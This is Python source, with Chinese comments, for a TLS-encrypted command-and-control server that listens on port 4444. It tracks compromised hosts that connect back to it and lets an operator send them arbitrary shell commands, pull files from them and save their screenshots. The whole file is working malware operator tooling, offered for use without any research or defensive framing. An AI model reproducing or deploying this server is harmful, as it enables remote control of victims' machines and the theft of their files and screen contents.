import socket
import ssl
import threading
import sys
import struct

class SecureMasterC2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.sessions = {}
        self.counter = 1
        self.lock = threading.Lock()

    def start(self):
        # 创建标准的 SSL 上下文
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        # 加载服务端证书与私钥（需提前在目录下生成 cert.pem 和 key.pem）
        try:
            context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
        except Exception as e:
            print(f"[-] SSL 证书加载失败，请确保 cert.pem 和 key.pem 存在: {e}")
            return

        bind_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bind_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        bind_socket.bind((self.host, self.port))
        bind_socket.listen(15)
        print(f"[*] 加密安全 C2 主控端已启动，监听端口: {self.port}")

        threading.Thread(target=self._accept_loop, args=(bind_socket, context), daemon=True).start()
        self._console()

    def _accept_loop(self, server_socket, context):
        while True:
            try:
                client_socket, address = server_socket.accept()
                # 使用 SSL 将原始 socket 包装为安全加密通道
                secure_sock = context.wrap_socket(client_socket, server_side=True)
                
                with self.lock:
                    sid = self.counter
                    self.sessions[sid] = (secure_sock, address)
                    self.counter += 1
                print(f"\n[+] 安全加密目标上线! 会话 ID: {sid} | 来源: {address[0]}:{address[1]}")
                print("C2-SecureMaster > ", end="", flush=True)
            except Exception:
                break

    def _console(self):
        while True:
            cmd = input("C2-SecureMaster > ").strip()
            if not cmd:
                continue
            
            parts = cmd.split(" ")
            action = parts[0].lower()

            if action == 'help':
                print("========== 安全 C2 指令帮助 ==========")
                print("  sessions                  - 查看所有在线受控主机")
                print("  interact <id>             - 进入指定主机交互界面")
                print("  exit                      - 关闭主控端")
            elif action == 'sessions':
                with self.lock:
                    print("\n--- 在线会话列表 ---")
                    for sid, (s, addr) in self.sessions.items():
                        print(f"ID: {sid} | IP: {addr[0]}:{addr[1]}")
                    print("--------------------\n")
            elif action == 'interact':
                if len(parts) < 2:
                    print("[-] 请指定会话 ID")
                    continue
                try:
                    sid = int(parts[1])
                    with self.lock:
                        if sid in self.sessions:
                            client_socket, _ = self.sessions[sid]
                        else:
                            print("[-] 无效的会话 ID")
                            continue
                    self._session_menu(client_socket, sid)
                except ValueError:
                    print("[-] ID 必须为数字")
            elif action == 'exit':
                sys.exit(0)

    def _session_menu(self, client_socket, sid):
        print(f"\n[*] 已进入会话 {sid} 的加密控制台。输入 'back' 返回主菜单。")
        while True:
            try:
                command = input(f"SecureSession({sid}) > ").strip()
                if not command:
                    continue
                if command.lower() == 'back':
                    break

                client_socket.sendall(command.encode('utf-8'))

                length_data = client_socket.recv(4)
                if not length_data:
                    print("[-] 目标主机连接已断开。")
                    break
                msg_length = struct.unpack('!I', length_data)[0]

                data = b""
                while len(data) < msg_length:
                    packet = client_socket.recv(msg_length - len(data))
                    if not packet:
                        break
                    data += packet

                if command.startswith('download '):
                    filename = command.split(' ', 1)[1].split('/')[-1].split('\\')[-1]
                    if data.startswith(b"[-]"):
                        print(data.decode('utf-8', errors='ignore'))
                    else:
                        with open(filename, "wb") as f:
                            f.write(data)
                        print(f"[+] 文件下载成功，已保存为: {filename}")
                elif command == 'screenshot':
                    if data.startswith(b"[-]"):
                        print(data.decode('utf-8', errors='ignore'))
                    else:
                        img_name = f"screenshot_session_{sid}.jpg"
                        with open(img_name, "wb") as f:
                            f.write(data)
                        print(f"[+] 加密压缩截图已保存为: {img_name}")
                else:
                    print(data.decode('utf-8', errors='ignore'))

            except Exception as e:
                print(f"[-] 会话通信异常: {e}")
                with self.lock:
                    if sid in self.sessions:
                        del self.sessions[sid]
                break

if __name__ == '__main__':
    server = SecureMasterC2Server()
    server.start()
